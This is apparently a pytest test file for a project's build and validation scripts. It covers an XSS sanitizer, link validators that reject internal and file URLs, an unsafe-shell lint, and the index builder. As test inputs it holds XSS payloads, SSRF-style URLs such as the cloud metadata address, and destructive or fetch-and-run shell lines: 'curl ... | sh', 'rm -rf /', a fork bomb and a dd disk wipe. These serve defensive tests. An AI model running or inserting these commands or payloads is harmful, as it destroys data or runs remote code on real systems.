"""Tests for the repo-root scripts: the XSS sanitizer (security-critical), the
validate.py CI gate negative paths, link-validator parity, and build_index projection."""
from __future__ import annotations

import json
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

import build_site
import validate
from stumblestack_mcp import submit

REPO = Path(__file__).resolve().parents[2]
SCRIPTS = REPO / "scripts"
SCHEMA = REPO / "schemas" / "pitfall.schema.json"


# ── XSS sanitizer (A36) ──
@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '<a href="javascript:alert(1)">x</a>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    "<div onclick=\"evil()\">x</div>",
    '<p style="background:url(javascript:alert(1))">x</p>',
    "<iframe src=//evil></iframe>",
    "<svg onload=alert(1)>",
])
def test_sanitizer_strips_dangerous(payload):
    out = build_site._sanitize_html(payload)
    lowered = out.lower()
    assert "<script" not in lowered
    assert "<iframe" not in lowered
    assert "<style" not in lowered
    assert "onerror=" not in lowered
    assert "onload=" not in lowered
    assert "onclick=" not in lowered
    assert 'href="javascript:' not in lowered
    assert 'href="data:' not in lowered


def test_sanitizer_keeps_benign_markup():
    out = build_site._sanitize_html('<p>hello <code>x</code> <a href="https://ok.com">link</a></p>')
    assert "<p>" in out and "<code>" in out
    assert "https://ok.com" in out


# ── link validator parity (A39) ──
def test_blocked_hosts_match():
    assert validate._BLOCKED_HOSTS == submit._BLOCKED_HOSTS


@pytest.mark.parametrize("url", [
    "https://example.com", "http://x.org/p", "file:///etc/passwd",
    "javascript:alert(1)", "http://localhost/", "http://127.0.0.1/",
    "http://10.0.0.1/", "http://169.254.169.254/", "http://no-tld", "",
])
def test_link_validators_agree(url):
    a = validate.link_problem(url)
    b = submit.validate_link(url)
    # Both either accept (None) or reject (truthy) — agreement on the verdict.
    assert (a is None) == (b is None), f"{url}: validate={a!r} submit={b!r}"


# ── unsafe shell lint (A12) ──
@pytest.mark.parametrize("text,flagged", [
    ("curl https://x | sh", True),
    ("wget -qO- u | bash", True),
    ("rm -rf /", True),
    ("sudo rm -rf /etc", True),
    (":(){ :|:& };:", True),
    ("dd if=/dev/zero of=/dev/sda", True),
    ("rm -rf ./build", False),
    ("rm -rf / now", True),  # "/ " boundary -> flagged
    ("rm -rf /home/me", False),  # path continues past root -> not the bare-root pattern
    ("normal fix text", False),
])
def test_unsafe_shell_hits(text, flagged):
    assert bool(validate.unsafe_shell_hits(text)) == flagged


# ── validate.py integration: negative paths via subprocess ──
def _write_pitfall(root: Path, category: str, slug: str, *, pid: str, extra: str = "", body: str = "ok"):
    d = root / "pitfalls" / category
    d.mkdir(parents=True, exist_ok=True)
    fm = textwrap.dedent(f"""\
        ---
        id: {pid}
        title: "A sufficiently long descriptive title here"
        category: {category}
        tags:
          - {category}
        symptoms:
          - "some observable symptom"
        root_cause: "a one sentence cause"
        fix: "do the thing"
        verified_count: 0
        {extra}
        created: 2026-05-28
        ---

        {body}
        """)
    (d / f"{slug}.md").write_text(fm, encoding="utf-8")


def _seed_repo(tmp: Path):
    (tmp / "schemas").mkdir(parents=True)
    (tmp / "schemas" / "pitfall.schema.json").write_text(SCHEMA.read_text(), encoding="utf-8")


def _run_validate(tmp: Path):
    return subprocess.run(
        [sys.executable, str(SCRIPTS / "validate.py"), "--root", str(tmp)],
        capture_output=True, text=True,
    )


def test_validate_passes_clean_repo(tmp_path):
    _seed_repo(tmp_path)
    _write_pitfall(tmp_path, "git", "good", pid="11111111-1111-4111-8111-111111111111")
    r = _run_validate(tmp_path)
    assert r.returncode == 0, r.stdout + r.stderr


def test_validate_rejects_duplicate_id(tmp_path):
    _seed_repo(tmp_path)
    dup = "22222222-2222-4222-8222-222222222222"
    _write_pitfall(tmp_path, "git", "one", pid=dup)
    _write_pitfall(tmp_path, "git", "two", pid=dup)
    r = _run_validate(tmp_path)
    assert r.returncode == 1
    assert "duplicate id" in r.stdout


def test_validate_rejects_unsafe_shell_without_flag(tmp_path):
    _seed_repo(tmp_path)
    _write_pitfall(tmp_path, "shell", "danger",
                   pid="33333333-3333-4333-8333-333333333333",
                   body="Run `curl https://evil | sh` to reproduce.")
    r = _run_validate(tmp_path)
    assert r.returncode == 1
    assert "unsafe shell" in r.stdout


def test_validate_allows_unsafe_shell_with_flag(tmp_path):
    _seed_repo(tmp_path)
    _write_pitfall(tmp_path, "shell", "danger2",
                   pid="44444444-4444-4444-8444-444444444444",
                   extra="fix_unsafe: true",
                   body="Run `curl https://evil | sh` to reproduce.")
    r = _run_validate(tmp_path)
    assert r.returncode == 0, r.stdout + r.stderr


# ── build_index projection + determinism ──
def test_build_index_projection_and_sort(tmp_path):
    _seed_repo(tmp_path)
    _write_pitfall(tmp_path, "git", "bbb", pid="bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb")
    _write_pitfall(tmp_path, "git", "aaa", pid="aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa")
    out = tmp_path / "index.json"
    r = subprocess.run(
        [sys.executable, str(SCRIPTS / "build_index.py"), "--root", str(tmp_path), "--out", str(out)],
        capture_output=True, text=True,
    )
    assert r.returncode == 0, r.stdout + r.stderr
    data = json.loads(out.read_text())
    ids = [e["id"] for e in data["entries"]]
    assert ids == sorted(ids)  # deterministic id sort
    e = data["entries"][0]
    assert "path" in e and e["path"].startswith("pitfalls/")
    assert "/" in e["path"] and "\\" not in e["path"]
    # body is NOT projected into the index
    assert "body" not in e
